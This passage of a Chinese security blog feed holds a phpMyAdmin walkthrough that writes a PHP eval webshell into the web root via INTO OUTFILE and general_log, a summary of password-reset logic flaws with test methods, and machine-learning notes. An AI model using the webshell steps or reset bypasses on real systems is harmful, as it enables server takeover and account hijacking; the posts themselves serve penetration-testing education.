没有任何路径的写权限。</li><li>‘’： 拥有任何路径的写权限。</li><li>F:/wamp/tmp一类的文件路径： 仅在规定路径下有写权限。</li></ul><p>我们这里如果想直接写文件，需要在www目录下有写权限，为了查看效果，我们先将secure-file-priv改成’’来尝试一下直接写文件。</p><p>要注意，在root账户下的mysql中，也是无法直接对secure-file-priv进行更改的，要更改secure-file-priv，需要打开my.ini文件，将secure_file_priv的值更改，我们在这里将原本的secure-file-priv注释掉，然后写</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secure_file_priv</span>=<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin04.png?raw=true"></p><p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin05.png?raw=true"></p><p>然后我们在phpmyadmin的mysql控制台输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Create</span> <span class="hljs-keyword">TABLE</span> shell (webshell text <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>);<br><span class="hljs-keyword">Insert</span> <span class="hljs-keyword">INTO</span> shell (webshell) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;&lt;?php @eval($_POST[123456]);?&gt;&#x27;</span>);<br><span class="hljs-keyword">select</span> webshell <span class="hljs-keyword">from</span> shell <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;F:/wamp/www/eval.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin06.png?raw=true"></p><p>然后通过菜刀访问：</p><p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin07.png?raw=true"></p><h2 id="0x03-使用log文件"><a href="#0x03-使用log文件" class="headerlink" title="0x03 使用log文件"></a>0x03 使用log文件</h2><p>那么如果是一般的情况，我们只有其他路径权限或者完全没有写权限的时候该怎么做呢？此时有个奇淫技巧，就是使用log文件来写一句话木马。</p><p>phpmyadmin有一个负责mysql日志的文件，通常是关闭的，因为如果一直打开，这个文件随着mysql的查询会变的非常非常的巨大，只有调试时才会有管理员打开。</p><p>不过不同于上面的secure-file-priv无法通过mysql的root账户更改，这个功能是可以直接在mysql的root账户更改的。</p><p>首先我们查看一下这个功能相关的变量：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%general_log%&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin08.png?raw=true"></p><p>可以看到两个变量，其中general_log代表日志功能的开关，general_log_file代表日志功能存储的位置，这都是我们可控的变量，现在我们就要把general_log_file改到可以访问的网站目录中的文件，并且把日志功能开启。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&quot;F:/wamp/www/shell.php&quot;</span><br><span class="hljs-builtin-name">set</span> global <span class="hljs-attribute">general_log</span>=<span class="hljs-string">&quot;ON&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin09.png?raw=true"></p><p>此时我们就打开了日志功能并且将日志保存路径切换到网站根目录下的shell.php</p><p>然后我们只需要查询一个一句话木马（注意这里用双引号单引号混用的方法构造select，否则写在日志文件中php会解析错误）：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">SELECT &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;123456&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin10.png?raw=true"></p><p>就可以通过菜刀连接木马：</p><p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin11.png?raw=true"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>从这次的思路看，如果我们拿到phpmyadmin或者其他的数据库管理工具，甚至直接拿到mysql控制台权限，都可以尝试进一步拿到webshell，而且很可能权限还非常高，可以进一步控制整个服务器。所以将phpmyadmin等页面暴露在公网是十分危险的。</p><p>而且一直以来有很多网站管理员觉得服务器报错之后暴露些物理路径之类的东西无伤大雅，就不写专用的404页面，但是这次的思路也证明了，你的任何一个小失误，都有可能成为黑客入侵的助力，在敏感信息泄露和未授权访问等问题上一定要谨慎。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>任意密码重置总结</title>
    <link href="/2018/06/21/%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%80%BB%E7%BB%93/"/>
    <url>/2018/06/21/%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>密码重置是业务中十分重要且敏感的一环，在这里产生过很多任意密码重置的问题，是逻辑漏洞中很常见的一种。在这里总结一下任意密码重置的常见姿势。</p><h2 id="0x01-验证码不失效"><a href="#0x01-验证码不失效" class="headerlink" title="0x01 验证码不失效"></a>0x01 验证码不失效</h2><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>验证码不失效是多年前最常见的一种逻辑漏洞，其原理是找回密码判断时，仅判断验证码是否正确，没有对验证码的过期时间进行限制，导致可以进行爆破。</p><h4 id="测试方法："><a href="#测试方法：" class="headerlink" title="测试方法："></a>测试方法：</h4><p>通过枚举验证码直到找到真正的验证码跳转更改密码页面。</p><h2 id="0x02-验证码回显"><a href="#0x02-验证码回显" class="headerlink" title="0x02 验证码回显"></a>0x02 验证码回显</h2><h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h4><p>验证码回显是指发送验证码后，可以通过抓包等方式得到正确的验证码，直接填写验证码跳转更改密码页面。</p><h4 id="测试方法：-1"><a href="#测试方法：-1" class="headerlink" title="测试方法："></a>测试方法：</h4><p>通过截断数据包分析验证码是否直接写在cookie或者其他的字段中，如果捕获到，就可以直接填写。</p><h2 id="0x03-验证码不绑定用户"><a href="#0x03-验证码不绑定用户" class="headerlink" title="0x03 验证码不绑定用户"></a>0x03 验证码不绑定用户</h2><h4 id="原理：-2"><a href="#原理：-2" class="headerlink" title="原理："></a>原理：</h4><p>输入手机号和验证码进行重置密码的时候，仅对验证码是够正确进行了判断，未对该验证码是否与手机号匹配做验证。</p><h4 id="测试方法：-2"><a href="#测试方法：-2" class="headerlink" title="测试方法："></a>测试方法：</h4><p>在提交手机号和验证码的时候，替换手机号为其他手机号进行测试，成功通过验证并重置其密码。</p><h2 id="0x04-用户名未绑定邮箱号-手机号"><a href="#0x04-用户名未绑定邮箱号-手机号" class="headerlink" title="0x04 用户名未绑定邮箱号/手机号"></a>0x04 用户名未绑定邮箱号/手机号</h2><h4 id="原理：-3"><a href="#原理：-3" class="headerlink" title="原理："></a>原理：</h4><p>用户名、手机号、验证码三者没有统一进行验证，仅判断了三者中的手机号和验证是否匹配和正确，如果正确则判断成功并进入密码修改界面。</p><h4 id="测试方法：-3"><a href="#测试方法：-3" class="headerlink" title="测试方法："></a>测试方法：</h4><p>输入用户名获取验证码，通过抓包修改接收验证码的手机号为自己的号码，自己手机成功接收验证码，提交到网站进行验证，验证成功并进入密码修改界面。</p><h2 id="0x05-客户端验证绕过"><a href="#0x05-客户端验证绕过" class="headerlink" title="0x05 客户端验证绕过"></a>0x05 客户端验证绕过</h2><h4 id="原理：-4"><a href="#原理：-4" class="headerlink" title="原理："></a>原理：</h4><p>客户端在本地进行验证码是否正确的判断，主要是根据接收到验证成功或验证失败的包判断是否验证成功，而该判断结果也可以在本地修改，最终导致欺骗客户端，进入密码修改界面。</p><h4 id="测试方法：-4"><a href="#测试方法：-4" class="headerlink" title="测试方法："></a>测试方法：</h4><p>重置目标用户，输入错误验证码，修改返回包，把返回错误信息的包改为返回正确信息的包，即可绕过验证步骤，最终重置用户密码。</p><h2 id="0x06-跳过身份检验"><a href="#0x06-跳过身份检验" class="headerlink" title="0x06 跳过身份检验"></a>0x06 跳过身份检验</h2><h4 id="原理：-5"><a href="#原理：-5" class="headerlink" title="原理："></a>原理：</h4><p>信任域问题，用户输入验证码，直接跳转到设置新密码的这一步，服务器默认已经通过检验，值得信赖，于是便未再次作检验，就可以直接重置密码。</p><h4 id="测试方法：-5"><a href="#测试方法：-5" class="headerlink" title="测试方法："></a>测试方法：</h4><p>使用一个已知验证码账户记录每一步的链接，然后重置他人账户，点击获取验证码步骤之后直接手动控制网址跳转到输入新密码界面，重置其密码。</p><h2 id="0x07-修改新密码时未校验用户字段"><a href="#0x07-修改新密码时未校验用户字段" class="headerlink" title="0x07 修改新密码时未校验用户字段"></a>0x07 修改新密码时未校验用户字段</h2><h4 id="原理：-6"><a href="#原理：-6" class="headerlink" title="原理："></a>原理：</h4><p>在重置密码界面，没有再次对用户ID进行校验，导致提交参数时可以将用户ID更改，从而修改其他用户的密码。</p><h4 id="测试方法：-6"><a href="#测试方法：-6" class="headerlink" title="测试方法："></a>测试方法：</h4><p>使用自己账号和自己手机号进行密码重置，在最后重置密码时，抓包修改用户id相关信息，修改他人密码。</p><h2 id="0x08-cookie替换"><a href="#0x08-cookie替换" class="headerlink" title="0x08 cookie替换"></a>0x08 cookie替换</h2><h4 id="原理：-7"><a href="#原理：-7" class="headerlink" title="原理："></a>原理：</h4><p>重置密码时通过用户cookie判断用户是否通过了手机验证，而cookie值是用户可控的，可以通过修改cookie中的值欺骗服务器自己通过了验证来修改密码。</p><h4 id="测试方法：-7"><a href="#测试方法：-7" class="headerlink" title="测试方法："></a>测试方法：</h4><p>是用自己账号和手机号进行密码重置，在重置密码时，将cookie提取出来分析，如果服务器通过cookie判断是否通过手机验证，就使用他人账号进行重置，然后将cookie中判断是否通过验证的值改为已通过状态，即可重置密码。</p><h2 id="0x09-利用CSRF漏洞重置密码"><a href="#0x09-利用CSRF漏洞重置密码" class="headerlink" title="0x09 利用CSRF漏洞重置密码"></a>0x09 利用CSRF漏洞重置密码</h2><h4 id="原理：-8"><a href="#原理：-8" class="headerlink" title="原理："></a>原理：</h4><p>如果登陆状态可直接修改密码，且密码修改的请求没有验证token、referer也没有设置跨域权限。</p><h4 id="测试方法：-8"><a href="#测试方法：-8" class="headerlink" title="测试方法："></a>测试方法：</h4><p>用自己账号重置密码，在修改密码部分将请求截断，然后伪装链接发给他人，受害者在登陆状态误点链接即会被修改密码。</p><h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>任意密码重置是各个提供用户注册的企业都会面临的一个问题，在这方面稍有不慎就会产生很严重的后果。</p><p>而这类漏洞，黑盒测试的效果远大于白盒审计，所以总结了各种常见情况的测试方法，通过渗透测试来寻找漏洞，规避风险。</p><p>参考文档： <a href="http://teagle.top/index.php/logic.html">http://teagle.top/index.php/logic.html</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>逻辑处理漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习(2)——线性回归</title>
    <link href="/2018/06/20/%E6%9C%BA%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-2-%E2%80%94%E2%80%94%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"/>
    <url>/2018/06/20/%E6%9C%BA%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-2-%E2%80%94%E2%80%94%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>第一篇记录了机器学习的定义、分类和范围，这一篇开始从机器学习的方法学起，总结机器学习的经典方法，然后尽量自己写代码实现。</p><h2 id="0x01-回归算法"><a href="#0x01-回归算法" class="headerlink" title="0x01 回归算法"></a>0x01 回归算法</h2><p>回归算法属于机器学习中监督学习类的算法，是入门机器学习最基础的算法。</p><p>回归分析是研究自变量和因变量之间关系的一种预测模型技术。这些技术应用于预测，时间序列模型和找到变量之间关系。</p><p>回归算法就是量化因变量受自变量影响的大小，建立线性回归方程或者非线性回归方程，从而达对因变量的预测，或者对因变量的解释作用。</p><h2 id="0x02-回归分析流程"><a href="#0x02-回归分析流程" class="headerlink" title="0x02 回归分析流程"></a>0x02 回归分析流程</h2><p>①探索性分析，画不同变量之间的散点图，进行相关性检验等，了解数据的大致情况，以及得知重点关注那几个变量；</p><p>②变量和模型选择；</p><p>③回归分析假设条件验证；</p><p>④共线性和强影响点检查；</p><p>⑤模型修改，并且重复③④；</p><p>⑥模型验证。</p><h2 id="0x03-回归算法分类"><a href="#0x03-回归算法分类" class="headerlink" title="0x03 回归算法分类"></a>0x03 回归算法分类</h2><p>回归算法主要通过三种方法分类：自变量的个数、因变量的类型和回归线的形状。</p><p>常见的回归算法有：</p><ul><li>线性回归</li><li>逻辑回归</li><li>多项式回归</li><li>逐步回归</li><li>岭回归</li><li>Lasso回归</li><li>ElasticNet回归</li></ul><h2 id="0x04-线性回归-Linear-Regression"><a href="#0x04-线性回归-Linear-Regression" class="headerlink" title="0x04 线性回归(Linear Regression)"></a>0x04 线性回归(Linear Regression)</h2><p>线性回归是世界上最知名的建模方法之一，在线性回归模型中，因变量是连续型的，自变量可以使连续型或离散型的，回归线是线性的。</p><p>线性回归用最适直线(回归线)去建立因变量Y和一个或多个自变量X之间的关系。可以用公式来表示：</p><p>Y=A+B*X+e</p><p>A为截距，B为回归线的斜率，e是误差项。</p><p>简单线性回归与多元线性回归的差别在于：多元线性回归有多个(&gt;1)自变量，而简单线性回归只有一个自变量。</p><h4 id="简单线性回归"><a href="#简单线性回归" class="headerlink" title="简单线性回归"></a>简单线性回归</h4><p>我们首先实现一个只有单一自变量的简单线性回归</p><p>我们实现这个算法，可以先以Andrew Ng机器学习讲义中美国俄亥俄州Portland Oregon城市房屋价格为例：</p><p>这个例子中近简化使用房屋面积一个因子作为自变量，y轴对应其因变量房屋价格。所以我们机器学习的线性回归就变为对于给定有限的数据集，进行一元线性回归，即找到一个一次函数y=y(x) + e，使得y满足</p><p>当x={2104, 1600, 2400, 1416, 3000, … }, y={400, 330, 369, 232, 540, … } </p><table><thead><tr><th>面积(feet²)</th><th>价格(1000$)</th></tr></thead><tbody><tr><td>2104</td><td>400</td></tr><tr><td>1600</td><td>330</td></tr><tr><td>2400</td><td>369</td></tr><tr><td>1416</td><td>232</td></tr><tr><td>3000</td><td>540</td></tr><tr><td>···</td><td>···</td></tr></tbody></table><p>对这个问题我们先给出假设函数即需要拟合的直线：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_01.png?raw=true"></p><p>其中a和b是我们要求得的参数，参数得变化会引起函数的变化。</p><p>而我们解出参数之后的函数是否为最优解，我们需要引入一个概念：Cost Function，即代价函数或成本函数。</p><h4 id="代价函数-Cost-Function"><a href="#代价函数-Cost-Function" class="headerlink" title="代价函数(Cost Function)"></a>代价函数(Cost Function)</h4><p>在回归问题中，衡量最优解的常用代价函数为平方误差。</p><p>平方误差在高中和大学的概率论、统计学等课程中我们都有所了解，就是用样本数据和拟合出的线做差值，然后对差值进行平方和并除以点数m计算平均值。</p><p>而在这里，我们要导出代价函数，额外除以1/2做数学简化，形成以下代价函数：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_02.png?raw=true"></p><p>ps：这里额外除以1/2，是为了之后平方函数的微分项将抵消1/2项，以方便计算梯度下降。</p><p>下来我们求解最优解的问题就转变为了求解代价函数的最小值。</p><p>其中J是基于θ的函数，我们可以先将其简化成只有θ1的函数，令θ0=0.</p><p>然后我们不断给定θ1的值，基于样本值进行计算代价函数J，就可以得到一个θ1和J的函数，并在某一点取得极小值。</p><p>如样本数据为y ={(1,1), (2,2),(3,3)}时，可以得到如下的J-θ1图形：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_03.png?raw=true"></p><p>我们求解线性回归最优解的方法一般是梯度下降法和最小二乘法</p><h4 id="最小二乘法"><a href="#最小二乘法" class="headerlink" title="最小二乘法"></a>最小二乘法</h4><p>代价函数中使用的均方误差，其实对应了我们常用的欧几里得的距离（欧式距离，Euclidean Distance）, 基于均方误差最小化进行模型求解的方法称为“最小二乘法”（least square method），即通过最小化误差的平方和寻找数据的最佳函数匹配。</p><p>当函数子变量为一维时，最小二乘法就蜕变成寻找一条直线。</p><p>如我们上例中的模型，寻找J极小值就是分别用J对θ1和θ0求偏导，然后寻找偏导为零的点。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_04.png?raw=true"></p><p>解得：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_05.png?raw=true"></p><h5 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h5><p>最小二乘法算法简单，容易理解，而然在现实机器学习却有其局限性：</p><ul><li><p>并非所有函数都可以求出驻点，即导数为0的点，f(x)=0</p></li><li><p>求解方程困难，或求根公式复杂</p></li><li><p>导数并无解析解</p></li><li><p>最小二乘法的矩阵公式,计算一个矩阵的逆是相当耗费时间的, 而且求逆也会存在数值不稳定的情况</p></li></ul><h4 id="梯度下降法"><a href="#梯度下降法" class="headerlink" title="梯度下降法"></a>梯度下降法</h4><p>正是由于在实际中，最小二乘法遇到的困难和局限性，尤其是多数超定方程组不存在解，我们由求导转向迭代逼近。也就是梯度下降算法。</p><p>首先我们了解一下什么是梯度，这在复变函数等大学课程中都曾经学过。</p><h5 id="方向导数"><a href="#方向导数" class="headerlink" title="方向导数"></a>方向导数</h5><p>方向导数即研究在某一点的任意方向的变化率，是偏导数的广义扩展。</p><h5 id="梯度"><a href="#梯度" class="headerlink" title="梯度"></a>梯度</h5><p>梯度则基于方向导数，是一个向量而非数，梯度代表了各个方向导数中，变化趋势最大的那个方向。</p><p>那么，梯度方向就是增长最快的方向，负梯度方向就是减小最快的方向。</p><h5 id="梯度下降算法"><a href="#梯度下降算法" class="headerlink" title="梯度下降算法"></a>梯度下降算法</h5><p>梯度下降算法通常也被称作最速下降法。其目的是找到一个局部极小值点；其目标与最小二乘法相同，都是使得估算值与实际值的总平方差尽量小。</p><p>其方法是采用计算数学的迭代法，先给定一初始点，然后向下降最快的方向调整，在若干次迭代之后找到局部最小。</p><p>比如我们给定上面的方程，初始参数是θ0,θ1，我们不断改变θ0,θ1从而减少J(θ0,θ1)的值，具体做法是求导。直到最终收敛。</p><p>迭代公式如下：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_06.png?raw=true"></p><p>其中θj可以是θ0和θ1这两个参数，α为步长，整个式子的意义为，θ0,θ1每次向J(θ0,θ1)负梯度方向下降步长α。</p><h5 id="学习率"><a href="#学习率" class="headerlink" title="学习率"></a>学习率</h5><p>公式中的步长α，也称为学习率，用来控制每次下降的幅度。</p><p>我们应该调整参数α以确保梯度下降算法在合理的时间内收敛。</p><ul><li>如果α过小，每步会移动非常近，收敛时间就会很长。</li><li>如果α过大，每步会移动比较远，会导致直接越过极小值，甚至无法收敛到最低点。</li></ul><p>如果我们时间耗费较长或无法收敛，那就说明我们要重新制定学习率α。</p><h5 id="线性回归梯度下降"><a href="#线性回归梯度下降" class="headerlink" title="线性回归梯度下降"></a>线性回归梯度下降</h5><p>对于线性模型，我们可以这样写梯度下降函数。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_07.png?raw=true"></p><p>h(x)是需要拟合的函数。<br>J(θ)称为均方误差或cost function。用来衡量训练集众的样本对线性模式的拟合程度。<br>m为训练集众样本的个数。<br>θ是我们最终需要通过梯度下降法来求得的参数。</p><p>接下来的梯度下降法就有两种不同的迭代思路。</p><h5 id="批量梯度下降（Batch-Gradient-Descent）"><a href="#批量梯度下降（Batch-Gradient-Descent）" class="headerlink" title="批量梯度下降（Batch Gradient Descent）"></a>批量梯度下降（Batch Gradient Descent）</h5><p>可以看到上述每次迭代都需要计算所有样本的残差并加和，批量梯度下降是梯度下降法最原始的形式，它的具体思路是在更新每一参数时都使用所有的样本来进行更新。</p><p>1.计算J(θ)关于θT的偏导数,也就得到了向量中每一个θ的梯度。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_08.png?raw=true"></p><p>2.沿着梯度的反方向更新参数θ的值</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_09.png?raw=true"></p><p>3.迭代直到收敛。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_10.png?raw=true"></p><ul><li><p>优点：全局最优解，易于并行实现。</p></li><li><p>缺点：当样本数目很多时，训练过程会很慢。</p></li></ul><h5 id="随机梯度下降（Stochastic-gradient-descent）"><a href="#随机梯度下降（Stochastic-gradient-descent）" class="headerlink" title="随机梯度下降（Stochastic gradient descent）"></a>随机梯度下降（Stochastic gradient descent）</h5><p>和批量梯度有所不同的地方在于，每次迭代只选取一个样本的数据，一旦到达最大的迭代次数或是满足预期的精度，就停止。</p><p>随机梯度下降法的θ更新表达式。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_11.png?raw=true"></p><p>迭代直到收敛。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_12.png?raw=true"></p><ul><li><p>优点：训练速度快。</p></li><li><p>缺点：准确度下降，并不是全局最优，不易于并行实现。</p></li></ul><h5 id="视觉效果"><a href="#视觉效果" class="headerlink" title="视觉效果"></a>视觉效果</h5><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_13.png?raw=true"></p><p>当我们的成本函数处于图的坑底时，J值最小，为最佳解。</p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习(1)——定义与分类</title>
    <link href="/2018/06/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-1-%E2%80%94%E2%80%94%E5%AE%9A%E4%B9%89%E4%B8%8E%E5%88%86%E7%B1%BB/"/>
    <url>/2018/06/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-1-%E2%80%94%E2%80%94%E5%AE%9A%E4%B9%89%E4%B8%8E%E5%88%86%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>因为假期实习能选择的安全项目大部分都要用到机器学习，而自己对这个领域缺乏了解，所以准备用一段时间专心学习一下。</p><h2 id="0x01-机器学习-Machine-Learning"><a href="#0x01-机器学习-Machine-Learning" class="headerlink" title="0x01 机器学习(Machine Learning)"></a>0x01 机器学习(Machine Learning)</h2><p>机器学习在不同的领域和不同的学者中有着不同的定义，我认为Alpaydin的定义更偏向于现代机器学习的核心内容：“机器学习是用数据或以往的经验，以此优化计算机程序的性能标准。”(Machine learning is programming computers to optimize a performance criterion using example data or past experience.)</p><p>也就是说，机器学习方法是计算机利用已有的数据，得出了某种模型，并利用此模型预测未来的一种方法。</p><p>机器学习与人类思考的对比：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml1_01.png?raw=true"></p><h2 id="0x02-按照学习策略分类"><a href="#0x02-按照学习策略分类" class="headerlink" title="0x02 按照学习策略分类"></a>0x02 按照学习策略分类</h2><p>机器学习的学习策略指学习过程中系统所采用的推理策略。按照学习策略可以将机器学习分为下列几类：</p><h4 id="1-机械学习-Rote-learning"><a href="#1-机械学习-Rote-learning" class="headerlink" title="(1)机械学习 (Rote learning)"></a>(1)机械学习 (Rote learning)</h4><p>学习者无需任何推理或其它的知识转换，直接吸取环境所提供的信息。如塞缪尔的跳棋程序，纽厄尔和西蒙的LT系统。这类学习系统主要考虑的是如何索引存贮的知识并加以利用。系统的学习方法是直接通过事先编好、构造好的程序来学习，学习者不作任何工作，或者是通过直接接收既定的事实和数据进行学习，对输入信息不作任何的推理。</p><h4 id="2-示教学习-Learning-from-instruction"><a href="#2-示教学习-Learning-from-instruction" class="headerlink" title="(2)示教学习 (Learning from instruction)"></a>(2)示教学习 (Learning from instruction)</h4><p>学生从环境（教师或其它信息源如教科书等）获取信息，把知识转换成内部可使用的表示形式，并将新的知识和原有知识有机地结合为一体。所以要求学生有一定程度的推理能力，但环境仍要做大量的工作。教师以某种形式提出和组织知识，以使学生拥有的知识可以不断地增加。这种学习方法和人类社会的学校教学方式相似，学习的任务就是建立一个系统，使它能接受教导和建议，并有效地存贮和应用学到的知识。不少专家系统在建立知识库时使用这种方法去实现知识获取。示教学习的一个典型应用例是FOO程序。</p><h4 id="3-演绎学习-Learning-by-deduction"><a href="#3-演绎学习-Learning-by-deduction" class="headerlink" title="(3)演绎学习 (Learning by deduction)"></a>(3)演绎学习 (Learning by deduction)</h4><p>学生所用的推理形式为演绎推理。推理从公理出发，经过逻辑变换推导出结论。这种推理是”保真”变换和特化(specialization)的过程，使学生在推理过程中可以获取有用的知识。这种学习方法包含宏操作(macro-operation)学习、知识编辑和组块(Chunking)技术。演绎推理的逆过程是归纳推理。</p><h4 id="4-类比学习-Learning-by-analogy"><a href="#4-类比学习-Learning-by-analogy" class="headerlink" title="(4)类比学习 (Learning by analogy)"></a>(4)类比学习 (Learning by analogy)</h4><p>利用二个不同领域（源域、目标域）中的知识相似性，可以通过类比，从源域的知识（包括相似的特征和其它性质）推导出目标域的相应知识，从而实现学习。类比学习系统可以使一个已有的计算机应用系统转变为适应于新的领域，来完成原先没有设计的相类似的功能。</p><h4 id="5-基于解释的学习-Explanation-based-learning-EBL"><a href="#5-基于解释的学习-Explanation-based-learning-EBL" class="headerlink" title="(5)基于解释的学习 (Explanation-based learning, EBL)"></a>(5)基于解释的学习 (Explanation-based learning, EBL)</h4><p>学生根据教师提供的目标概念、该概念的一个例子、领域理论及可操作准则，首先构造一个解释来说明为什该例子满足目标概念，然后将解释推广为目标概念的一个满足可操作准则的充分条件。EBL已被广泛应用于知识库求精和改善系统的性能。<br>著名的EBL系统有迪乔恩（G.DeJong）的GENESIS,米切尔（T.Mitchell）的LEXII和LEAP, 以及明顿（S.Minton）等的PRODIGY。</p><h4 id="6-归纳学习-Learning-from-induction"><a href="#6-归纳学习-Learning-from-induction" class="headerlink" title="(6)归纳学习 (Learning from induction)"></a>(6)归纳学习 (Learning from induction)</h4><p>归纳学习是由教师或环境提供某概念的一些实例或反例，让学生通过归纳推理得出该概念的一般描述。这种学习的推理工作量远多于示教学习和演绎学习，因为环境并不提供一般性概念描述（如公理）。从某种程度上说，归纳学习的推理量也比类比学习大，因为没有一个类似的概念可以作为”源概念”加以取用。归纳学习是最基本的，发展也较为成熟的学习方法，在人工智能领域中已经得到广泛的研究和应用。</p><h2 id="0x03-按照所获取知识的表示形式分类"><a href="#0x03-按照所获取知识的表示形式分类" class="headerlink" title="0x03 按照所获取知识的表示形式分类"></a>0x03 按照所获取知识的表示形式分类</h2><h4 id="1-代数表达式参数"><a href="#1-代数表达式参数" class="headerlink" title="(1)代数表达式参数"></a>(1)代数表达式参数</h4><p>学习的目标是调节一个固定函数形式的代数表达式参数或系数来达到一个理想的性能。</p><h4 id="2-决策树"><a href="#2-决策树" class="headerlink" title="(2)决策树"></a>(2)决策树</h4><p>用决策树来划分物体的类属，树中每一内部节点对应一个物体属性，而每一边对应于这些属性的可选值，树的叶节点则对应于物体的每个基本分类。</p><h4 id="3-形式文法"><a href="#3-形式文法" class="headerlink" title="(3)形式文法"></a>(3)形式文法</h4><p>在识别一个特定语言的学习中，通过对该语言的一系列表达式进行归纳，形成该语言的形式文法。</p><h4 id="4-产生式规则"><a href="#4-产生式规则" class="headerlink" title="(4)产生式规则"></a>(4)产生式规则</h4><p>产生式规则表示为条件—动作对，已被极为广泛地使用。学习系统中的学习行为主要是：生成、泛化、特化（Specialization）或合成产生式规则。</p><h4 id="5-形式逻辑表达式"><a href="#5-形式逻辑表达式" class="headerlink" title="(5)形式逻辑表达式"></a>(5)形式逻辑表达式</h4><p>形式逻辑表达式的基本成分是命题、谓词、变量、约束变量范围的语句，及嵌入的逻辑表达式。</p><h4 id="6-图和网络"><a href="#6-图和网络" class="headerlink" title="(6)图和网络"></a>(6)图和网络</h4><p>有的系统采用图匹配和图转换方案来有效地比较和索引知识。</p><h4 id="7-框架和模式（schema）"><a href="#7-框架和模式（schema）" class="headerlink" title="(7)框架和模式（schema）"></a>(7)框架和模式（schema）</h4><p>每个框架包含一组槽，用于描述事物（概念和个体）的各个方面。</p><h4 id="8-计算机程序和其它的过程编码"><a 